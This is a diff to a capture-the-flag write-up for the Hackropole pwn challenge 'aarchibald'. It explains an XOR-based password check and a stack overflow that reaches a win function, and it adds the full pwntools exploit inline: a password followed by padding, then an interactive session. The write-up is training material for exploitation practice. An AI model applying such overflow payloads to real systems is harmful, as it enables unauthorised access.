@@ -4,6 +4,10 @@ title = "Hackropole | Aarchibald"
 
 # [Pwn] aarchibald | hackropole
 
+* [1. Checksec](#checksec)
+* [2. Writeup](#writeup)
+* [3. Full exploit](#full-exploit)
+
 ## Checksec
 
 ```bash
@@ -16,7 +20,6 @@ title = "Hackropole | Aarchibald"
 ```
 
 ## Writeup
-
 
 Firstly we're gonna open our binary into a decompiler and we can directly see that there is a loop which will XOR our input with 0x32 value and then compare the 13 first bytes of the result with another value at the address 0xc30
 ![xor + strcmp](/images/aarchibald/xor_strcmp.png)
@@ -37,6 +40,17 @@ We see that there is only one variable on the stack which contains a value and t
 
 ![win](/images/aarchibald/win.png)
 
-you can find the full exploit [here](/exploits/aarchibald.py)
+## Full exploit
+
+```python
+from pwn import *
+
+def exploit(io, elf, libc=None):
+    payload = b'SuPerpAsSworDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' 
+    io.sendlineafter(':\n', payload)
+    io.interactive()
+```
+
+[download here](/exploits/aarchibald.py)
 
 written by *0xB0tm4n*
